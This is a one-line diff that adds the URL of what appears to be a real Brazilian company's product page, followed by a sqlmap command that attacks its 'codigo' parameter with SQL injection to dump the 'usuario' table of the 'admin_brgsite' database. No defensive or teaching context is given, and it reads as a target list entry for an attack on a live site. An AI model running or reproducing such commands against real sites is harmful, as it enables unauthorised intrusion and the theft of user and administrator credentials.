@@ -1,0 +1,1 @@
+https://www.brggeradores.com.br/produto.php?codigo=6 (GET)  # sqlmap.py -u https://www.brggeradores.com.br/produto.php?codigo=6 -D admin_brgsite -T usuario --dump --threads 10 -v3
